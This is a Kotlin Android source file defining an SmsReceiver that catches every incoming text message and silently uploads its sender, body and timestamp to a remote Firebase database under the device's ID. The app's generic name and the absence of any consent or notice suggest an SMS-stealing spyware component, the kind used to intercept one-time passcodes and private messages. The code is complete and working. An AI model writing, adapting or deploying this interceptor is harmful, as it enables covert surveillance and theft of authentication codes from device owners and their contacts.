package com.example.aplay

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.telephony.SmsMessage
import com.google.firebase.database.FirebaseDatabase

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            val pdus = bundle?.get("pdus") as? Array<*> ?: return
            val format = bundle.getString("format")

            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown_device"

            val smsRef = FirebaseDatabase.getInstance().getReference("sms").child(deviceId)

            for (pdu in pdus) {
                val sms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    SmsMessage.createFromPdu(pdu as ByteArray, format)
                } else {
                    SmsMessage.createFromPdu(pdu as ByteArray)
                }

                val smsData = mapOf(
                    "id" to System.currentTimeMillis().toString(),
                    "sender" to sms.originatingAddress,
                    "body" to sms.messageBody,
                    "timestamp" to sms.timestampMillis
                )

                smsRef.push().setValue(smsData)
            }
        }
    }
}
